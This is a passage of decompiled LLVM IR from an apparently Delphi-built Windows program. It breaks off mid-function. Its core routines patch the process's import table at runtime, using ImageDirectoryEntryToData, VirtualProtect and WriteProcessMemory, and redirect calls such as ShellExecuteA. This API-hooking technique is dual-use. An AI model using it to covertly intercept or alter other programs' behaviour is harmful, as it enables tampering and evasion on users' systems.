define i32* @function_4049e0(i32* %Base, i8 %MappedAsImage, i16 %DirectoryEntry, i32* %Size) local_unnamed_addr {
dec_label_pc_4049e0:
  %0 = call i32* @ImageDirectoryEntryToData(i32* %Base, i8 %MappedAsImage, i16 %DirectoryEntry, i32* %Size), !insn.addr !472
  ret i32* %0, !insn.addr !472
}

define i32 @function_4049e8() local_unnamed_addr {
dec_label_pc_4049e8:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !473
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !473
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !473
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !474
  %2 = load i32, i32* @global_var_40968c, align 4, !insn.addr !475
  %3 = add i32 %2, 1, !insn.addr !475
  store i32 %3, i32* @global_var_40968c, align 4, !insn.addr !475
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !476
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !477
  ret i32 0, !insn.addr !478
}

define i32 @function_404a0d() local_unnamed_addr {
dec_label_pc_404a0d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !479
  ret i32 %0, !insn.addr !479
}

define i32 @function_404a12() local_unnamed_addr {
dec_label_pc_404a12:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !480
}

define i32 @function_404a14(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a14:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !481
}

define i32 @function_404a18() local_unnamed_addr {
dec_label_pc_404a18:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40968c, align 4, !insn.addr !482
  %2 = add i32 %1, -1, !insn.addr !482
  store i32 %2, i32* @global_var_40968c, align 4, !insn.addr !482
  ret i32 %0, !insn.addr !483
}

define i32 @function_404a78(i8* %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404a78:
  %esp.1.reg2mem = alloca i32, !insn.addr !484
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !484
  %eax.0.reg2mem = alloca i32, !insn.addr !484
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %6 = trunc i32 %4 to i8, !insn.addr !485
  %7 = icmp eq i8 %6, 0, !insn.addr !485
  store i32* %stack_var_-20, i32** %esp.0.in.reg2mem, !insn.addr !486
  br i1 %7, label %dec_label_pc_404a8b, label %dec_label_pc_404a83, !insn.addr !486

dec_label_pc_404a83:                              ; preds = %dec_label_pc_404a78
  %8 = call i32 @"@ClassCreate"(i32 %2, i32 %5, i32 %3, i32 %1, i32 %0), !insn.addr !487
  store i32 %8, i32* %eax.0.reg2mem, !insn.addr !487
  store i32* %stack_var_-36, i32** %esp.0.in.reg2mem, !insn.addr !487
  br label %dec_label_pc_404a8b, !insn.addr !487

dec_label_pc_404a8b:                              ; preds = %dec_label_pc_404a83, %dec_label_pc_404a78
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %9 = add i32 %esp.0, -4, !insn.addr !488
  %10 = and i32 %4, 255
  %11 = inttoptr i32 %10 to i8*, !insn.addr !489
  %12 = call i32* @GetModuleHandleA(i8* %11), !insn.addr !489
  %13 = ptrtoint i32* %12 to i32, !insn.addr !489
  %14 = add i32 %eax.0.reload, 8, !insn.addr !490
  %15 = inttoptr i32 %14 to i32*, !insn.addr !490
  store i32 %13, i32* %15, align 4, !insn.addr !490
  %16 = icmp eq i32* %12, null, !insn.addr !491
  store i32 %9, i32* %esp.1.reg2mem, !insn.addr !492
  br i1 %16, label %dec_label_pc_404ae3, label %dec_label_pc_404aa7, !insn.addr !492

dec_label_pc_404aa7:                              ; preds = %dec_label_pc_404a8b
  %17 = ptrtoint i8* %arg1 to i32, !insn.addr !493
  %18 = add i32 %eax.0.reload, 12, !insn.addr !494
  %19 = inttoptr i32 %18 to i32*, !insn.addr !494
  store i32 %17, i32* %19, align 4, !insn.addr !494
  %20 = ptrtoint i8* %arg2 to i32, !insn.addr !495
  %21 = add i32 %eax.0.reload, 16, !insn.addr !496
  %22 = inttoptr i32 %21 to i32*, !insn.addr !496
  store i32 %20, i32* %22, align 4, !insn.addr !496
  %23 = add i32 %eax.0.reload, 20, !insn.addr !497
  %24 = inttoptr i32 %23 to i32*, !insn.addr !497
  store i32 %arg3, i32* %24, align 4, !insn.addr !497
  %25 = load i32, i32* %22, align 4, !insn.addr !498
  %26 = add i32 %esp.0, -8, !insn.addr !499
  %27 = inttoptr i32 %26 to i32*, !insn.addr !499
  store i32 %25, i32* %27, align 4, !insn.addr !499
  %28 = add i32 %esp.0, -12, !insn.addr !500
  %29 = inttoptr i32 %28 to i32*, !insn.addr !500
  store i32 %17, i32* %29, align 4, !insn.addr !500
  %30 = call i32* @GetModuleHandleA(i8* bitcast (i32* @0 to i8*)), !insn.addr !501
  %31 = ptrtoint i32* %30 to i32, !insn.addr !501
  %32 = add i32 %esp.0, -16, !insn.addr !502
  %33 = inttoptr i32 %32 to i32*, !insn.addr !502
  store i32 %31, i32* %33, align 4, !insn.addr !502
  %34 = call i32 ()* @GetProcAddress(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !503
  %35 = ptrtoint i32 ()* %34 to i32, !insn.addr !503
  %36 = add i32 %eax.0.reload, 24, !insn.addr !504
  %37 = inttoptr i32 %36 to i32*, !insn.addr !504
  store i32 %35, i32* %37, align 4, !insn.addr !504
  %38 = icmp eq i32 ()* %34, null, !insn.addr !505
  store i32 %32, i32* %esp.1.reg2mem, !insn.addr !506
  br i1 %38, label %dec_label_pc_404ae3, label %dec_label_pc_404acf, !insn.addr !506

dec_label_pc_404acf:                              ; preds = %dec_label_pc_404aa7
  %39 = load i32, i32* %24, align 4, !insn.addr !507
  %40 = add i32 %esp.0, -20, !insn.addr !508
  %41 = inttoptr i32 %40 to i32*, !insn.addr !508
  store i32 %39, i32* %41, align 4, !insn.addr !508
  %42 = load i32, i32* %15, align 4, !insn.addr !509
  %43 = add i32 %esp.0, -24, !insn.addr !510
  %44 = inttoptr i32 %43 to i32*, !insn.addr !510
  store i32 %42, i32* %44, align 4, !insn.addr !510
  %45 = call i32 @function_404b4c(i32 ptrtoint (i32* @0 to i32)), !insn.addr !511
  store i32 %43, i32* %esp.1.reg2mem, !insn.addr !511
  br label %dec_label_pc_404ae3, !insn.addr !511

dec_label_pc_404ae3:                              ; preds = %dec_label_pc_404acf, %dec_label_pc_404aa7, %dec_label_pc_404a8b
  br i1 %7, label %dec_label_pc_404afa, label %dec_label_pc_404aeb, !insn.addr !512

dec_label_pc_404aeb:                              ; preds = %dec_label_pc_404ae3
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %46 = call i32 @function_402b48(), !insn.addr !513
  %47 = inttoptr i32 %esp.1.reload to i32*, !insn.addr !514
  %48 = load i32, i32* %47, align 4, !insn.addr !514
  call void @__writefsdword(i32 0, i32 %48), !insn.addr !514
  br label %dec_label_pc_404afa, !insn.addr !515

dec_label_pc_404afa:                              ; preds = %dec_label_pc_404aeb, %dec_label_pc_404ae3
  %49 = add i32 %eax.0.reload, 4, !insn.addr !516
  %50 = inttoptr i32 %49 to i32*, !insn.addr !516
  %51 = inttoptr i32 %9 to i32*, !insn.addr !488
  ret i32 %eax.0.reload, !insn.addr !517
}

define i32 @function_404b04() local_unnamed_addr {
dec_label_pc_404b04:
  %eax.1.reg2mem = alloca i32, !insn.addr !518
  %eax.0.reg2mem = alloca i32, !insn.addr !518
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @"@BeforeDestruction"(i32 %1, i32 %0), !insn.addr !519
  %4 = add i32 %3, 8, !insn.addr !520
  %5 = inttoptr i32 %4 to i32*, !insn.addr !520
  %6 = load i32, i32* %5, align 4, !insn.addr !520
  %7 = icmp eq i32 %6, 0, !insn.addr !520
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !521
  br i1 %7, label %dec_label_pc_404b3e, label %dec_label_pc_404b15, !insn.addr !521

dec_label_pc_404b15:                              ; preds = %dec_label_pc_404b04
  %8 = add i32 %3, 24, !insn.addr !522
  %9 = inttoptr i32 %8 to i32*, !insn.addr !522
  %10 = load i32, i32* %9, align 4, !insn.addr !522
  %11 = icmp eq i32 %10, 0, !insn.addr !522
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !523
  br i1 %11, label %dec_label_pc_404b3e, label %dec_label_pc_404b1b, !insn.addr !523

dec_label_pc_404b1b:                              ; preds = %dec_label_pc_404b15
  %12 = add i32 %3, 4, !insn.addr !524
  %13 = inttoptr i32 %12 to i32*, !insn.addr !524
  %14 = load i32, i32* %13, align 4, !insn.addr !524
  %15 = inttoptr i32 %14 to i8*, !insn.addr !525
  %16 = call i32* @GetModuleHandleA(i8* %15), !insn.addr !526
  %17 = ptrtoint i32* %16 to i32, !insn.addr !526
  %18 = load i32, i32* %5, align 4, !insn.addr !527
  %19 = icmp eq i32 %18, %17, !insn.addr !527
  %20 = icmp eq i1 %19, false, !insn.addr !528
  store i32 %17, i32* %eax.0.reg2mem, !insn.addr !528
  br i1 %20, label %dec_label_pc_404b3e, label %dec_label_pc_404b29, !insn.addr !528

dec_label_pc_404b29:                              ; preds = %dec_label_pc_404b1b
  %21 = load i32, i32* %9, align 4, !insn.addr !529
  %22 = call i32 @function_404b4c(i32 %21), !insn.addr !530
  store i32 %22, i32* %eax.0.reg2mem, !insn.addr !530
  br label %dec_label_pc_404b3e, !insn.addr !530

dec_label_pc_404b3e:                              ; preds = %dec_label_pc_404b29, %dec_label_pc_404b1b, %dec_label_pc_404b15, %dec_label_pc_404b04
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %23 = trunc i32 %2 to i8, !insn.addr !531
  %24 = icmp slt i8 %23, 1
  store i32 %eax.0.reload, i32* %eax.1.reg2mem, !insn.addr !532
  br i1 %24, label %dec_label_pc_404b49, label %dec_label_pc_404b42, !insn.addr !532

dec_label_pc_404b42:                              ; preds = %dec_label_pc_404b3e
  %25 = call i32 @"@ClassDestroy"(), !insn.addr !533
  store i32 %25, i32* %eax.1.reg2mem, !insn.addr !533
  br label %dec_label_pc_404b49, !insn.addr !533

dec_label_pc_404b49:                              ; preds = %dec_label_pc_404b42, %dec_label_pc_404b3e
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  ret i32 %eax.1.reload, !insn.addr !534
}

define i32 @function_404b4c(i32 %arg1) local_unnamed_addr {
dec_label_pc_404b4c:
  %eax.0.reg2mem = alloca i32, !insn.addr !535
  %esp.0.reg2mem = alloca i32, !insn.addr !535
  %storemerge6.reg2mem = alloca i32, !insn.addr !535
  %.reg2mem14 = alloca i32, !insn.addr !535
  %esp.17.reg2mem = alloca i32, !insn.addr !535
  %esi.08.reg2mem = alloca i32, !insn.addr !535
  %.reg2mem = alloca i32, !insn.addr !535
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_8 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %3 = icmp sgt i32 %arg1, -1, !insn.addr !536
  %4 = icmp eq i1 %3, false, !insn.addr !537
  %5 = icmp eq i32 %arg1, 0, !insn.addr !538
  %or.cond = or i1 %5, %4
  br i1 %or.cond, label %dec_label_pc_404bf9, label %dec_label_pc_404b72, !insn.addr !537

dec_label_pc_404b72:                              ; preds = %dec_label_pc_404b4c
  %6 = trunc i32 %2 to i16, !insn.addr !539
  %7 = trunc i32 %1 to i8, !insn.addr !540
  store i32 %arg1, i32* %stack_var_-52, align 4, !insn.addr !541
  %8 = inttoptr i32 %0 to i32*, !insn.addr !542
  %9 = call i32* @ImageDirectoryEntryToData(i32* %8, i8 %7, i16 %6, i32* nonnull @0), !insn.addr !542
  %10 = ptrtoint i32* %9 to i32, !insn.addr !542
  %11 = icmp eq i32* %9, null, !insn.addr !543
  store i32 %10, i32* %eax.0.reg2mem, !insn.addr !544
  br i1 %11, label %dec_label_pc_404bf9, label %dec_label_pc_404bf2.preheader, !insn.addr !544

dec_label_pc_404bf2.preheader:                    ; preds = %dec_label_pc_404b72
  %12 = add i32 %10, 12, !insn.addr !545
  %13 = inttoptr i32 %12 to i32*, !insn.addr !545
  %14 = load i32, i32* %13, align 4, !insn.addr !545
  %15 = icmp eq i32 %14, 0, !insn.addr !546
  %16 = icmp eq i1 %15, false, !insn.addr !547
  store i32 %14, i32* %eax.0.reg2mem, !insn.addr !547
  br i1 %16, label %dec_label_pc_404b8b.lr.ph, label %dec_label_pc_404bf9, !insn.addr !547

dec_label_pc_404b8b.lr.ph:                        ; preds = %dec_label_pc_404bf2.preheader
  %17 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !541
  %sext = mul i32 %1, 16777216
  %18 = sdiv i32 %sext, 16777216, !insn.addr !548
  %sext4 = mul i32 %2, 65536
  %19 = sdiv i32 %sext4, 65536
  %20 = ptrtoint i32* %stack_var_-20 to i32
  %21 = ptrtoint i32* %stack_var_-24 to i32
  %22 = ptrtoint i32* %stack_var_8 to i32
  store i32 %14, i32* %.reg2mem
  store i32 %10, i32* %esi.08.reg2mem
  store i32 %17, i32* %esp.17.reg2mem
  br label %dec_label_pc_404b8b

dec_label_pc_404b8b:                              ; preds = %dec_label_pc_404b8b.lr.ph, %dec_label_pc_404bef
  %esp.17.reload = load i32, i32* %esp.17.reg2mem
  %esi.08.reload = load i32, i32* %esi.08.reg2mem
  %.reload = load i32, i32* %.reg2mem
  %23 = add i32 %.reload, %arg1, !insn.addr !549
  %24 = add i32 %esp.17.reload, -4, !insn.addr !550
  %25 = inttoptr i32 %24 to i32*, !insn.addr !550
  store i32 %18, i32* %25, align 4, !insn.addr !550
  %26 = add i32 %esp.17.reload, -8, !insn.addr !551
  %27 = inttoptr i32 %26 to i32*, !insn.addr !551
  store i32 %23, i32* %27, align 4, !insn.addr !551
  %28 = call i32 @lstrcmpiA(i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !552
  %29 = icmp eq i32 %28, 0, !insn.addr !553
  %30 = icmp eq i1 %29, false, !insn.addr !554
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !554
  br i1 %30, label %dec_label_pc_404bef, label %dec_label_pc_404b9e, !insn.addr !554

dec_label_pc_404b9e:                              ; preds = %dec_label_pc_404b8b
  %31 = add i32 %esi.08.reload, 16, !insn.addr !555
  %32 = inttoptr i32 %31 to i32*, !insn.addr !555
  %33 = load i32, i32* %32, align 4, !insn.addr !555
  %34 = add i32 %33, %arg1, !insn.addr !556
  %35 = inttoptr i32 %34 to i32*, !insn.addr !557
  %36 = load i32, i32* %35, align 4, !insn.addr !557
  %37 = icmp eq i32 %36, 0, !insn.addr !558
  %38 = icmp eq i1 %37, false, !insn.addr !559
  store i32 %36, i32* %.reg2mem14, !insn.addr !559
  store i32 %34, i32* %storemerge6.reg2mem, !insn.addr !559
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !559
  br i1 %38, label %dec_label_pc_404ba6, label %dec_label_pc_404bef, !insn.addr !559

dec_label_pc_404ba6:                              ; preds = %dec_label_pc_404b9e, %dec_label_pc_404be6
  %storemerge6.reload = load i32, i32* %storemerge6.reg2mem
  %.reload15 = load i32, i32* %.reg2mem14
  %39 = icmp eq i32 %.reload15, %19, !insn.addr !560
  %40 = icmp eq i1 %39, false, !insn.addr !561
  br i1 %40, label %dec_label_pc_404be6, label %dec_label_pc_404bab, !insn.addr !561

dec_label_pc_404bab:                              ; preds = %dec_label_pc_404ba6
  %41 = add i32 %esp.17.reload, -12, !insn.addr !562
  %42 = inttoptr i32 %41 to i32*, !insn.addr !562
  store i32 %20, i32* %42, align 4, !insn.addr !562
  %43 = add i32 %esp.17.reload, -16, !insn.addr !563
  %44 = inttoptr i32 %43 to i32*, !insn.addr !563
  store i32 128, i32* %44, align 4, !insn.addr !563
  %45 = add i32 %esp.17.reload, -20, !insn.addr !564
  %46 = inttoptr i32 %45 to i32*, !insn.addr !564
  store i32 4, i32* %46, align 4, !insn.addr !564
  %47 = add i32 %esp.17.reload, -24, !insn.addr !565
  %48 = inttoptr i32 %47 to i32*, !insn.addr !565
  store i32 %storemerge6.reload, i32* %48, align 4, !insn.addr !565
  %49 = call i1 @VirtualProtect(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !566
  %50 = add i32 %esp.17.reload, -28, !insn.addr !567
  %51 = inttoptr i32 %50 to i32*, !insn.addr !567
  store i32 %21, i32* %51, align 4, !insn.addr !567
  %52 = add i32 %esp.17.reload, -32, !insn.addr !568
  %53 = inttoptr i32 %52 to i32*, !insn.addr !568
  store i32 4, i32* %53, align 4, !insn.addr !568
  %54 = add i32 %esp.17.reload, -36, !insn.addr !569
  %55 = inttoptr i32 %54 to i32*, !insn.addr !569
  store i32 %22, i32* %55, align 4, !insn.addr !569
  %56 = add i32 %esp.17.reload, -40, !insn.addr !570
  %57 = inttoptr i32 %56 to i32*, !insn.addr !570
  store i32 %storemerge6.reload, i32* %57, align 4, !insn.addr !570
  %58 = call i32* @GetCurrentProcess(), !insn.addr !571
  %59 = ptrtoint i32* %58 to i32, !insn.addr !571
  %60 = add i32 %esp.17.reload, -44, !insn.addr !572
  %61 = inttoptr i32 %60 to i32*, !insn.addr !572
  store i32 %59, i32* %61, align 4, !insn.addr !572
  %62 = call i1 @WriteProcessMemory(i32* nonnull @0, i32* nonnull @0, i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !573
  %63 = add i32 %esp.17.reload, -48, !insn.addr !574
  %64 = inttoptr i32 %63 to i32*, !insn.addr !574
  store i32 %21, i32* %64, align 4, !insn.addr !574
  %65 = load i32, i32* %stack_var_-20, align 4, !insn.addr !575
  %66 = add i32 %esp.17.reload, -52, !insn.addr !576
  %67 = inttoptr i32 %66 to i32*, !insn.addr !576
  store i32 %65, i32* %67, align 4, !insn.addr !576
  %68 = add i32 %esp.17.reload, -56, !insn.addr !577
  %69 = inttoptr i32 %68 to i32*, !insn.addr !577
  store i32 4, i32* %69, align 4, !insn.addr !577
  %70 = add i32 %esp.17.reload, -60, !insn.addr !578
  %71 = inttoptr i32 %70 to i32*, !insn.addr !578
  store i32 %storemerge6.reload, i32* %71, align 4, !insn.addr !578
  %72 = call i1 @VirtualProtect(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !579
  store i32 %70, i32* %esp.0.reg2mem, !insn.addr !580
  br label %dec_label_pc_404bef, !insn.addr !580

dec_label_pc_404be6:                              ; preds = %dec_label_pc_404ba6
  %73 = add i32 %storemerge6.reload, 4, !insn.addr !581
  %74 = inttoptr i32 %73 to i32*, !insn.addr !557
  %75 = load i32, i32* %74, align 4, !insn.addr !557
  %76 = icmp eq i32 %75, 0, !insn.addr !558
  %77 = icmp eq i1 %76, false, !insn.addr !559
  store i32 %75, i32* %.reg2mem14, !insn.addr !559
  store i32 %73, i32* %storemerge6.reg2mem, !insn.addr !559
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !559
  br i1 %77, label %dec_label_pc_404ba6, label %dec_label_pc_404bef, !insn.addr !559

dec_label_pc_404bef:                              ; preds = %dec_label_pc_404be6, %dec_label_pc_404b9e, %dec_label_pc_404bab, %dec_label_pc_404b8b
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %78 = add i32 %esi.08.reload, 20, !insn.addr !582
  %79 = add i32 %esi.08.reload, 32, !insn.addr !545
  %80 = inttoptr i32 %79 to i32*, !insn.addr !545
  %81 = load i32, i32* %80, align 4, !insn.addr !545
  %82 = icmp eq i32 %81, 0, !insn.addr !546
  %83 = icmp eq i1 %82, false, !insn.addr !547
  store i32 %81, i32* %.reg2mem, !insn.addr !547
  store i32 %78, i32* %esi.08.reg2mem, !insn.addr !547
  store i32 %esp.0.reload, i32* %esp.17.reg2mem, !insn.addr !547
  store i32 %81, i32* %eax.0.reg2mem, !insn.addr !547
  br i1 %83, label %dec_label_pc_404b8b, label %dec_label_pc_404bf9, !insn.addr !547

dec_label_pc_404bf9:                              ; preds = %dec_label_pc_404bef, %dec_label_pc_404bf2.preheader, %dec_label_pc_404b72, %dec_label_pc_404b4c
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !583
}

define i32 @function_404c04(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_404c04:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, 24, !insn.addr !584
  %2 = inttoptr i32 %1 to i32*, !insn.addr !584
  %3 = load i32, i32* %2, align 4, !insn.addr !584
  ret i32 %3, !insn.addr !585
}

define i32 @function_404c08() local_unnamed_addr {
dec_label_pc_404c08:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !586
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !586
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !586
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !587
  %2 = load i32, i32* @global_var_409690, align 4, !insn.addr !588
  %3 = add i32 %2, 1, !insn.addr !588
  store i32 %3, i32* @global_var_409690, align 4, !insn.addr !588
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !589
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !590
  ret i32 0, !insn.addr !591
}

define i32 @function_404c2d() local_unnamed_addr {
dec_label_pc_404c2d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !592
  ret i32 %0, !insn.addr !592
}

define i32 @function_404c32() local_unnamed_addr {
dec_label_pc_404c32:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !593
}

define i32 @function_404c34(i32 %arg1) local_unnamed_addr {
dec_label_pc_404c34:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !594
}

define i32 @function_404c38() local_unnamed_addr {
dec_label_pc_404c38:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409690, align 4, !insn.addr !595
  %2 = add i32 %1, -1, !insn.addr !595
  store i32 %2, i32* @global_var_409690, align 4, !insn.addr !595
  ret i32 %0, !insn.addr !596
}

define i32* @function_404c40(i32* %hwnd, i8* %lpOperation, i8* %lpFile, i8* %lpParameters, i8* %lpDirectory, i32 %nShowCmd) local_unnamed_addr {
dec_label_pc_404c40:
  %0 = call i32* @ShellExecuteA(i32* %hwnd, i8* %lpOperation, i8* %lpFile, i8* %lpParameters, i8* %lpDirectory, i32 %nShowCmd), !insn.addr !597
  ret i32* %0, !insn.addr !597
}

define i32 @function_404c48() local_unnamed_addr {
dec_label_pc_404c48:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !598
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !598
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !598
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !599
  %2 = load i32, i32* @global_var_409694, align 4, !insn.addr !600
  %3 = add i32 %2, 1, !insn.addr !600
  store i32 %3, i32* @global_var_409694, align 4, !insn.addr !600
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !601
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !602
  ret i32 0, !insn.addr !603
}

define i32 @function_404c6d() local_unnamed_addr {
dec_label_pc_404c6d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !604
  ret i32 %0, !insn.addr !604
}

define i32 @function_404c72() local_unnamed_addr {
dec_label_pc_404c72:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !605
}

define i32 @function_404c74(i32 %arg1) local_unnamed_addr {
dec_label_pc_404c74:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !606
}

define i32 @function_404c78() local_unnamed_addr {
dec_label_pc_404c78:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409694, align 4, !insn.addr !607
  %2 = add i32 %1, -1, !insn.addr !607
  store i32 %2, i32* @global_var_409694, align 4, !insn.addr !607
  ret i32 %0, !insn.addr !608
}

define i32 @function_404c80(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_404c80:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @function_404c04(i32 %1, i32 %2, i32 %0, i32 %arg1, i32 %arg2), !insn.addr !609
  ret i32 %3, !insn.addr !610
}

define i32 @function_404ccc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_404ccc:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %arg3, 2975, !insn.addr !611
  %2 = icmp eq i1 %1, false, !insn.addr !612
  %spec.select = select i1 %2, i32 %arg3, i32 2974
  %3 = call i32 @function_404c04(i32 %0, i32 %arg1, i32 %arg2, i32 %spec.select, i32 %arg4), !insn.addr !613
  ret i32 %3, !insn.addr !614
}

define i32 @function_404cfc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_404cfc:
  %stack_var_-32 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !615
  store i32 %0, i32* %stack_var_-32, align 4, !insn.addr !615
  %1 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !615
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !616
  %2 = call i32 @"@LStrFromPChar"(), !insn.addr !617
  %3 = call i32 @"@LStrPos"(), !insn.addr !618
  %4 = icmp slt i32 %3, 1
  %spec.select = select i1 %4, i32 %arg4, i32 ptrtoint ([33 x i8]* @global_var_404dd4 to i32)
  %5 = call i32 @"@LStrFromPChar"(), !insn.addr !619
  %6 = call i32 @"@LStrPos"(), !insn.addr !620
  %7 = icmp slt i32 %6, 1
  %esi.0 = select i1 %7, i32 %arg3, i32 ptrtoint ([33 x i8]* @global_var_404dd4 to i32)
  %8 = call i32 @function_404c04(i32 %arg1, i32 %arg2, i32 %esi.0, i32 %spec.select, i32 %arg5), !insn.addr !621
  call void @__writefsdword(i32 0, i32 %arg6), !insn.addr !622
  %9 = call i32 @"@LStrArrayClr"(), !insn.addr !623
  ret i32 %9, !insn.addr !624
}

define i32 @function_404d94() local_unnamed_addr {
dec_label_pc_404d94:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !625
  ret i32 %0, !insn.addr !625
}

define i32 @function_404d99() local_unnamed_addr {
dec_label_pc_404d99:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !626
}

define i32 @function_404d9b(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_404d9b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !627
}

define i32 @function_404dab() local_unnamed_addr {
dec_label_pc_404dab:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !628
}

define i32 @function_404df8() local_unnamed_addr {
dec_label_pc_404df8:
  %0 = call i32 @function_404a78(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_404e68, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_404e74, i32 0, i32 0), i32 4213888), !insn.addr !629
  store i32 %0, i32* @global_var_4080f8, align 4, !insn.addr !630
  %1 = call i32 @function_404a78(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_404e68, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_404e90, i32 0, i32 0), i32 4213964), !insn.addr !631
  store i32 %1, i32* @global_var_4080fc, align 4, !insn.addr !632
  %2 = call i32 @function_404a78(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_404ea8, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_404eb4, i32 0, i32 0), i32 4214012), !insn.addr !633
  store i32 %2, i32* @global_var_408100, align 4, !insn.addr !634
  ret i32 %2, !insn.addr !635
}

define i32 @function_404e68(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11, i32 %arg12, i32 %arg13, i32 %arg14, i32 %arg15, i32 %arg16) local_unnamed_addr {
dec_label_pc_404e68:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
